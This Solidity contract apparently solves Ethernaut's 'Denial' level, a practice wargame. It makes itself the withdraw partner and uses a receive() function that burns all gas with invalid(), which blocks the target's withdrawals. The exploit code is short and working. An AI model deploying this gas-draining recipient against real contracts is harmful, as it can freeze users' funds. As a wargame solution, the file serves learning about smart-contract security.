// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IDenial.sol";

/**
 * @title Denial Attack (Ethernaut Challenge Level 20 - Denial)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 20
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0xf1D573178225513eDAA795bE9206f7E311EeDEc3
 * @custom:security-contact emretepedev@gmail.com
 */
contract DenialAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IDenial target) external {
        target.setWithdrawPartner(address(this));

        require(address(this) == target.partner(), "Denial: Wrong address");

        target.withdraw();
    }

    /*//////////////////////////////////////////////////////////////
                            Helpers & Others
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Consume all gas and bubble-up the effects
     * @dev Neither revert nor assert not consume all gas since Solidity 0.8.0
     */
    receive() external payable {
        // solhint-disable no-inline-assembly
        /// @solidity memory-safe-assembly
        assembly {
            invalid()
        }
        // solhint-enable no-inline-assembly
    }
}
